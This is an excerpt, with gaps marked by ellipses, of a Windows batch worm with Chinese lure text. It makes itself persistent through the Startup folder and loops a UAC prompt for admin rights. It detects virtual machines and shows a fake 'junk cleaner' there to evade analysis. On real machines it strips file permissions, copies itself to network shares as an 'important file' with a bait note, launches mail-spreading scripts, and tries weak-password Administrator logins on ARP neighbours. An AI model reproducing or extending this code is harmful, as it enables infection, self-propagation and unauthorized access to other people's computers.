...
@echo off
copy %0 C:\Users\%username%\Documents\temp.bat
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy C:\Users\%username%\Documents\temp.bat systemed.bat
...
echo wscript.sleep 10 >> %Temp%\Wait.vbs
del /f /q %temp%\getadmin.vbs
start /wait %Temp%\Wait.vbs
if exist C:\igotadmin.txt (
exit /b
) else (
goto UACPrompt
)
...
:main
echo @echo off >C:\Windows\vir\hide.bat
echo echo 垃圾清理程序开始 >>C:\Windows\vir\hide.bat
echo del /f /q %temp%\*.* >>C:\Windows\vir\hide.bat
echo echo 清理完成 >>C:\Windows\vir\hide.bat
echo pause >>C:\Windows\vir\hide.bat
echo | reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS /v SystemProductName >> C:\Windows\vir\isvm.txt
set dn=C:\Windows\vir\isvm.txt
findstr  Virtual C:\Windows\vir\isvm.txt >nul&&(goto vm)||(goto tm)
:vm
start C:\Windows\vir\hide.bat
exit
:tm
attrib +r C:\Windows\vir
attrib +r C:\Windows\vir\*.*
cacls C:\Windows\vir\*.* /e /r everyone:c
cacls C:\Windows\vir\sys.bat /e /r everyone:c
cacls C:\Windows\vir\sys.bat /e /r administrator:c
...
for /f "tokens=2,* delims= " %%i in ('net share') do (
copy C:\Windows\vir\sys.bat %%i\重要文件.bat
echo 重要文件，双击 重要文件.bat 查看 >>%%i\重要通知.txt
)
cd /d C:\
...
copy C:\Windows\vir\sys.bat C:\Users\%username%\OneDrive\sys.bat
start C:\Windows\vir\mail.vbs
start C:\Windows\vir\mail2.vbs
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ c:\) do echo imh >> %%i\imh.txt
for /f "skip=3 tokens=1,* delims= " %%i in ('arp -a') do (
net use \\%%i\ipc$ "" /user:"Administrator"
net use \\%%i\ipc$ "111111" /user:"Administrator"
